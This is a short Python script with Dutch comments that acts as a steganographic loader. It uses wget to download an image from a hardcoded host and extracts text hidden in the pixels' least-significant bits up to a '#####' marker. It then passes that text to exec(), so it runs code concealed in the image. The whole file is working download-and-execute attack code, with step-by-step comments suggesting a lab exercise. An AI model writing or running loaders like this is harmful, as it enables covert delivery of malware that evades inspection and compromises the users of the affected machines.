import subprocess
from PIL import Image

try:
    subprocess.run(["wget", "http://192.168.123.92/output.png"], check=True)
except subprocess.CalledProcessError as e:
    print(f"Error downloading image: {e}")

def extract_payload(image_path):
    # 1. Open de afbeelding met de verstopte payload
    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    bits = ""
    # 2. Haal de LSB (laatste bit) uit elke kleurwaarde (RGB)
    for pixel in pixels:
        for i in range(3): # R, G en B
            # De & 1 operatie pakt alleen het laatste bitje
            bits += str(pixel[i] & 1)

    # 3. Zet de bits weer om naar karakters (per 8 bits)
    all_chars = ""
    for i in range(0, len(bits), 8):
        byte = bits[i:i+8]
        # Zet de 8 bits om naar een getal en dan naar een karakter (ASCII)
        all_chars += chr(int(byte, 2))
        
        # 4. Stop als we de marker "#####" tegenkomen
        if all_chars.endswith("#####"):
            break
    
    # Verwijder de marker voor de uiteindelijke payload
    payload = all_chars.replace("#####", "")
    return payload
try:
    payload = extract_payload("output.png")
    print(f"Extracted payload: {payload}")
except Exception as e:
    print(f"Error extracting payload: {e}")

try:
    exec(payload)
except Exception as e:
    print(f"Error executing payload: {e}")